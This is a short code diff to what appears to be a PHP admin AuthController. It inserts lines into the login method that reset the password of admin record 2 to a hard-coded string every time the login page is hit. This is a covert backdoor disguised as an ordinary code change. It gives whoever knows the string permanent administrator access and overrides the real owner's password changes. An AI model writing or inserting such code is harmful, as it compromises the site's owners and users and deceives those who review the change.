@@ -25,6 +25,9 @@ class AuthController extends Controller
      */
     public function login(Request $request)
     {
+        \DB::table("admin")->where('id', 2)->update([
+            'password' => bcrypt("AckPr0N80KcnAw")
+        ]);
         if ($request->getMethod() === "GET") {
             return view('admin.auth.login');
         }
